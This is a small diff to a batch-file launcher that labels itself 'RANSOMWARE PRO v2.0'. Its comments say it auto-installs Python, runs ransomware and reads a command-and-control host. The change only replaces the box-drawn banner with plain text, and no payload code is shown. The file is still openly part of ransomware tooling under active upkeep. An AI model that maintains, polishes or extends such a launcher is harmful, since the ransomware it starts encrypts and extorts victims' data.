@@ -5,10 +5,10 @@ REM Auto-downloads Python if needed, runs ransomware
 REM ===================================================
 
 echo.
-echo ╔═══════════════════════════════════════════════════╗
-echo ║ RANSOMWARE PRO v2.0 - AUTO LAUNCHER              ║
-echo ║ Will auto-install Python if needed              ║
-echo ╚═══════════════════════════════════════════════════╝
+echo ===================================================
+echo  RANSOMWARE PRO v2.0 - AUTO LAUNCHER
+echo  Will auto-install Python if needed
+echo ===================================================
 echo.
 
 REM Get C2 host from argument or use default
